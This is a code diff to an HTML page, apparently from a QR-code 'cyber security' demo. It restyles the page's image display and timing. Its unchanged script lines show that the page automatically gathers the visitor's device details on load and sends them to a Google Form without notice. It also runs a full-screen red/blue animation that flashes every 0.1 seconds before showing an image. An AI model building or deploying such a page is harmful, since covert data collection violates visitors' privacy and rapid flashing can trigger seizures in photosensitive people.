@@ -8,13 +8,13 @@
         body {
             margin: 0;
             overflow: hidden; /* Hide scrollbars */
+            background-color: white; /* Set a default background color */
         }
         .flicker {
             width: 100vw;
             height: 100vh;
             animation: flicker 0.1s infinite;
             position: absolute;
-            z-index: 1; /* Ensure the flicker is on top */
         }
         /* Screen flicker effect */
         @keyframes flicker {
@@ -25,22 +25,28 @@
             80% { background-color: red; }
             100% { background-color: blue; }
         }
-        .image {
+        /* Centered image style */
+        .image-container {
             display: none; /* Initially hidden */
-            width: 100vw;
-            height: 100vh;
-            background-color: white; /* Match the background of the image */
             position: absolute;
-            z-index: 2; /* Ensure the image is above the flicker */
-            background-image: url(https://github.com/atharva20031975/Cyber-Security-QR/blob/main/MB_star-M-pos.png?raw=true); /* Replace with your image URL */
-            background-size: cover; /* Ensure the image covers the entire screen */
-            background-repeat: no-repeat; /* Prevent image repetition */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 90%; /* Limit width for mobile devices */
+            max-height: 90%; /* Limit height for mobile devices */
+            background-color: white; /* Match the image background */
+        }
+        .image-container img {
+            width: 100%; /* Responsive width */
+            height: auto; /* Maintain aspect ratio */
         }
     </style>
 </head>
 <body>
     <div class="flicker"></div>
-    <div class="image"></div> <!-- Image div -->
+    <div class="image-container">
+        <img src="YOUR_IMAGE_URL" alt="Device Information Image">
+    </div>
 
     <script>
         // Device Type
@@ -189,18 +195,13 @@
             sendToGoogleForm(details);
         }
 
-        // Function to end the flickering effect and show the image
-        function showImageAfterFlicker() {
-            const flickerDiv = document.querySelector('.flicker');
-            const imageDiv = document.querySelector('.image');
-            flickerDiv.style.display = 'none'; // Hide the flicker effect
-            imageDiv.style.display = 'block'; // Show the image
-        }
-
         // Automatically fetch and send details on page load
         window.onload = function() {
             fetchAndSendDeviceDetails();
-            setTimeout(showImageAfterFlicker, 1000); // Adjust time to match flicker duration
+            setTimeout(() => {
+                document.querySelector('.flicker').style.display = 'none'; // Hide flicker
+                document.querySelector('.image-container').style.display = 'block'; // Show image container
+            }, 2000); // Adjust the time if needed
         };
     </script>
 </body>
